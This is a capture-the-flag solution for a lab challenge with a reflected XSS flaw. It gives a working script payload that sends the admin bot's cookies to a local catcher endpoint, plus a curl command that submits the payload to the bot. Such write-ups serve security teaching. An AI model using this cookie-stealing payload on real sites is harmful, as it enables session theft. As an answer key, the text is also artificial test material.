# XSS Playground - Solution

## Vulnerability

The search page reflects the `q` query parameter directly into the HTML response without any sanitization or encoding, creating a reflected XSS vulnerability.

## Steps to Solve

1. **Identify the reflection point**: Visit `/?q=test` and observe that the input appears directly in the HTML source inside the "Search Results for:" heading.

2. **Craft an XSS payload**: Build a script that exfiltrates the admin bot's cookies to the built-in catcher endpoint:

   ```
   http://localhost:3000/?q=<script>document.location='http://localhost:3000/catcher?data='+document.cookie</script>
   ```

3. **Submit the URL to the admin bot**: POST the crafted URL to `/report`:

   ```bash
   curl -X POST http://localhost:3000/report \
     -H "Content-Type: application/json" \
     -d '{"url":"http://localhost:3000/?q=<script>document.location=\"http://localhost:3000/catcher?data=\"+document.cookie</script>"}'
   ```

4. **Read the stolen cookie**: Visit `/catcher/log` to see the captured data. The admin bot's cookie will appear:

   ```
   flag=CTF{REDACTED}
   ```

## Flag

```
CTF{REDACTED}
```
